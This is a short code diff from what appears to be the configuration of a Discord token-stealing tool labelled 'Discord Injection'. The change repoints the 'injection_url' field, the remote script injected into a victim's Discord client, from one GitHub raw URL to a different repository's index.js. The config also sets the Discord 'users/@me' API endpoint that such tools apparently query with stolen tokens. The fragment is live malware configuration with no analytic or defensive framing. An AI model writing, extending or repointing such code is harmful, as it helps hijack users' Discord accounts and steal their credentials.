@@ -16,7 +16,7 @@ const config = {
   embed_name: 'Discord Injection',
   embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png',
   embed_color: 8363488,
-  injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/Finx69/Discord/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
